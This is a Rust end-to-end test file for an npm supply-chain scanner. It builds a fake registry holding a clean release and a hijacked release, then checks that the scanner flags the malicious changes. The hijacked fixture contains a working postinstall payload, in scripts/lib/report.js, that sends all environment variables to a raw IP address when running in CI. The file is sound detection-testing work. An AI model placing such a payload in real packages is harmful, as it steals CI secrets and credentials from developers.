//! End to end against a local fake registry: a clean 1.0.0 and a hijacked
//! 1.0.1 (postinstall that ships env vars to a raw IP, provenance dropped,
//! new publisher). No network.

use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;

use axum::extract::{Path, State};
use axum::http::StatusCode;
use axum::response::IntoResponse;
use axum::routing::get;
use axum::Router;
use base64::{engine::general_purpose::STANDARD as B64, Engine};
use npryx_scan::config::Config;
use npryx_scan::sign::{self, Envelope};
use serde_json::{json, Value};
use sha2::Digest;

fn tgz(entries: &[(&str, &str)]) -> Vec<u8> {
    let mut tar_bytes = Vec::new();
    {
        let mut b = tar::Builder::new(&mut tar_bytes);
        for (path, body) in entries {
            let mut h = tar::Header::new_gnu();
            h.set_size(body.len() as u64);
            h.set_mode(0o644);
            h.set_path(format!("package/{path}")).unwrap();
            h.set_cksum();
            b.append(&h, body.as_bytes()).unwrap();
        }
        b.finish().unwrap();
    }
    let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
    std::io::Write::write_all(&mut gz, &tar_bytes).unwrap();
    gz.finish().unwrap()
}

fn sri(b: &[u8]) -> String {
    format!("sha512-{}", B64.encode(sha2::Sha512::digest(b)))
}

struct Fake {
    packuments: Value,
    tarballs: Vec<(String, Vec<u8>)>,
    packument_hits: AtomicUsize,
}

async fn packument(State(f): State<Arc<Fake>>, Path(name): Path<String>) -> impl IntoResponse {
    f.packument_hits.fetch_add(1, Ordering::SeqCst);
    match f.packuments.get(&name) {
        Some(p) => (StatusCode::OK, axum::Json(p.clone())).into_response(),
        None => StatusCode::NOT_FOUND.into_response(),
    }
}

async fn tarball(State(f): State<Arc<Fake>>, Path(file): Path<String>) -> impl IntoResponse {
    match f.tarballs.iter().find(|(n, _)| *n == file) {
        Some((_, b)) => (StatusCode::OK, b.clone()).into_response(),
        None => StatusCode::NOT_FOUND.into_response(),
    }
}

struct Env {
    base: String,
    client: reqwest::Client,
    good: String,
    evil: String,
    fake: Arc<Fake>,
    _dir: tempfile::TempDir,
}

async fn start(keys_file: Option<&str>) -> Env {
    let good_tgz = tgz(&[
        ("package.json", r#"{"name":"demo","version":"1.0.0","main":"index.js"}"#),
        ("index.js", "module.exports = (a, b) => a + b;"),
    ]);
    let evil_tgz = tgz(&[
        ("package.json", r#"{"name":"demo","version":"1.0.1","main":"index.js","scripts":{"postinstall":"node scripts/setup.js"}}"#),
        ("index.js", "module.exports = (a, b) => a + b;"),
        ("scripts/setup.js", "require('./lib/report');"),
        (
            "scripts/lib/report.js",
            r#"
            const https = require('https');
            const os = require('os');
            if (process.env.CI) {
              const payload = JSON.stringify({ env: process.env, host: os.hostname() });
              const req = https.request({ hostname: '45.77.12.9', path: '/c', method: 'POST' });
              req.end(payload);
            }
            "#,
        ),
    ]);
    let (good, evil) = (sri(&good_tgz), sri(&evil_tgz));

    // fake registry
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let reg = format!("http://{}", listener.local_addr().unwrap());
    let packuments = json!({
        "demo": {
            "name": "demo",
            "versions": {
                "1.0.0": {
                    "name": "demo", "version": "1.0.0",
                    "dist": { "integrity": good, "tarball": format!("{reg}/tarballs/demo-1.0.0.tgz"), "attestations": { "url": "x", "provenance": { "predicateType": "https://slsa.dev/provenance/v1" } } },
                    "maintainers": [{ "name": "alice" }], "_npmUser": { "name": "alice" },
                    "repository": { "url": "git+https://github.com/acme/demo.git" }
                },
                "1.0.1": {
                    "name": "demo", "version": "1.0.1",
                    "dist": { "integrity": evil, "tarball": format!("{reg}/tarballs/demo-1.0.1.tgz") },
                    "maintainers": [{ "name": "alice" }], "_npmUser": { "name": "mallory" },
                    "scripts": { "postinstall": "node scripts/setup.js" },
                    "repository": { "url": "git+https://github.com/acme/demo.git" }
                }
            },
            "time": { "1.0.0": "2026-01-01T00:00:00Z", "1.0.1": "2026-09-01T00:00:00Z" }
        },
        "@acme/util": {
            "name": "@acme/util",
            "versions": { "2.0.0": { "dist": { "integrity": good, "tarball": format!("{reg}/tarballs/demo-1.0.0.tgz") } } },
            "time": { "2.0.0": "2026-01-01T00:00:00Z" }
        }
    });
    let fake = Arc::new(Fake {
        packuments,
        tarballs: vec![("demo-1.0.0.tgz".into(), good_tgz), ("demo-1.0.1.tgz".into(), evil_tgz)],
        packument_hits: AtomicUsize::new(0),
    });
    let app = Router::new()
        .route("/tarballs/{file}", get(tarball))
        .route("/{name}", get(packument))
        .with_state(fake.clone());
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });

    // scan server
    let dir = tempfile::tempdir().unwrap();
    let mut cfg = Config::for_tests(dir.path().to_path_buf(), reg);
    if let Some(k) = keys_file {
        cfg.api_keys = Some(npryx_scan::config::parse_keys(k).unwrap());
    }
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    tokio::spawn(async move { npryx_scan::serve(cfg, listener).await.unwrap() });

    Env { base, client: reqwest::Client::new(), good, evil, fake, _dir: dir }
}

impl Env {
    async fn pubkey(&self) -> String {
        let v: Value = self.client.get(format!("{}/v1/pubkey", self.base)).send().await.unwrap().json().await.unwrap();
        assert_eq!(v["alg"], "ed25519");
        v["key"].as_str().unwrap().to_string()
    }

    async fn scan(&self, path: &str, integrity: &str, extra: &str, token: Option<&str>) -> (u16, Value) {
        let mut req = self.client.get(format!("{}/v1/scan/{path}?integrity={}{extra}", self.base, urlencode(integrity)));
        if let Some(t) = token {
            req = req.bearer_auth(t);
        }
        let resp = req.send().await.unwrap();
        let status = resp.status().as_u16();
        let body: Value = resp.json().await.unwrap();
        if body.get("payload").is_some() {
            let env: Envelope = serde_json::from_value(body).unwrap();
            let payload = sign::open(&env, &self.pubkey().await).expect("signature must verify");
            return (status, serde_json::from_slice(&payload).unwrap());
        }
        (status, body)
    }
}

fn urlencode(s: &str) -> String {
    s.replace('+', "%2B").replace('/', "%2F").replace('=', "%3D")
}

fn ids(v: &Value) -> Vec<String> {
    v["findings"].as_array().unwrap().iter().map(|f| f["id"].as_str().unwrap().to_string()).collect()
}

#[tokio::test]
async fn hijacked_release_is_suspected_with_full_story() {
    let env = start(None).await;
    let (status, r) = env.scan("demo/1.0.1", &env.evil, "", None).await;
    assert_eq!(status, 200, "{r}");
    assert_eq!(r["status"], "done");
    assert_eq!(r["verdict"], "suspected");
    assert_eq!(r["previous"]["version"], "1.0.0");
    let ids = ids(&r);
    for want in [
        "net.exfil-flow",
        "net.raw-ip",
        "code.ci-gated-network",
        "script.install-added",
        "provenance.dropped",
        "maintainers.changed",
    ] {
        assert!(ids.contains(&want.to_string()), "missing {want} in {ids:?}");
    }
    let exfil = r["findings"].as_array().unwrap().iter().find(|f| f["id"] == "net.exfil-flow").unwrap();
    assert_eq!(exfil["phase"], "install");
    assert_eq!(exfil["severity"], "high");
    assert_eq!(exfil["new_since_previous"], true);
    assert_eq!(exfil["file"], "scripts/lib/report.js");
    let dest = r["network"]["destinations"].as_array().unwrap();
    assert!(dest.iter().any(|d| d["value"] == "45.77.12.9" && d["kind"] == "raw-ip" && d["new_since_previous"] == true));
}

#[tokio::test]
async fn clean_release_is_clean() {
    let env = start(None).await;
    let (status, r) = env.scan("demo/1.0.0", &env.good, "", None).await;
    assert_eq!(status, 200);
    assert_eq!(r["verdict"], "clean", "{r}");
    assert!(r["previous"].is_null());
}

#[tokio::test]
async fn second_request_is_a_cache_hit() {
    let env = start(None).await;
    env.scan("demo/1.0.1", &env.evil, "", None).await;
    let before = env.fake.packument_hits.load(Ordering::SeqCst);
    let (status, _) = env.scan("demo/1.0.1", &env.evil, "", None).await;
    assert_eq!(status, 200);
    assert_eq!(env.fake.packument_hits.load(Ordering::SeqCst), before, "served from cache");
}

#[tokio::test]
async fn concurrent_requests_share_one_scan() {
    let env = Arc::new(start(None).await);
    let mut tasks = Vec::new();
    for _ in 0..8 {
        let e = env.clone();
        tasks.push(tokio::spawn(async move { e.scan("demo/1.0.1", &e.evil, "", None).await.0 }));
    }
    for t in tasks {
        assert_eq!(t.await.unwrap(), 200);
    }
    assert_eq!(env.fake.packument_hits.load(Ordering::SeqCst), 1, "deduped in flight");
}

#[tokio::test]
async fn integrity_mismatch_is_409_and_confirmed() {
    let env = start(None).await;
    let (status, r) = env.scan("demo/1.0.1", &env.good, "", None).await;
    assert_eq!(status, 409);
    assert_eq!(r["status"], "integrity_mismatch");
    assert_eq!(r["registry_integrity"], env.evil);
    assert_eq!(r["verdict"], "confirmed");
    assert_eq!(ids(&r), ["registry.integrity-mismatch"]);
}

#[tokio::test]
async fn bad_input_and_not_found() {
    let env = start(None).await;
    assert_eq!(env.scan("demo/1.0.1", "md5-nope", "", None).await.0, 400);
    assert_eq!(env.scan("..%2Fetc/1.0.0", &env.good, "", None).await.0, 400);
    assert_eq!(env.scan("demo/9.9.9", &env.good, "", None).await.0, 404);
    assert_eq!(env.scan("nope/1.0.0", &env.good, "", None).await.0, 404);
}

#[tokio::test]
async fn scoped_names_both_encodings() {
    let env = start(None).await;
    let (s1, r1) = env.scan("@acme%2Futil/2.0.0", &env.good, "", None).await;
    assert_eq!(s1, 200, "{r1}");
    assert_eq!(r1["name"], "@acme/util");
    let (s2, _) = env.scan("@acme/util/2.0.0", &env.good, "", None).await;
    assert_eq!(s2, 200);
}

#[tokio::test]
async fn deep_scan_reports_sandbox_skipped_when_disabled() {
    let env = start(None).await;
    let (status, r) = env.scan("demo/1.0.0", &env.good, "&deep=1", None).await;
    assert_eq!(status, 200);
    assert_eq!(r["sandbox"]["status"], "skipped");
    assert!(r["sandbox"]["reason"].as_str().unwrap().contains("disabled"));
}

#[tokio::test]
async fn api_keys_and_rate_limit() {
    let env = start(Some("npryx_test_0123456789abcdef 2 acme\n")).await;
    assert_eq!(env.scan("demo/1.0.0", &env.good, "", None).await.0, 401);
    assert_eq!(env.scan("demo/1.0.0", &env.good, "", Some("npryx_wrong_0123456789")).await.0, 401);
    assert_eq!(env.scan("demo/1.0.0", &env.good, "", Some("npryx_test_0123456789abcdef")).await.0, 200);
    assert_eq!(env.scan("demo/1.0.0", &env.good, "", Some("npryx_test_0123456789abcdef")).await.0, 200);
    let (status, _) = env.scan("demo/1.0.0", &env.good, "", Some("npryx_test_0123456789abcdef")).await;
    assert_eq!(status, 429, "rpm 2 exhausted");
}
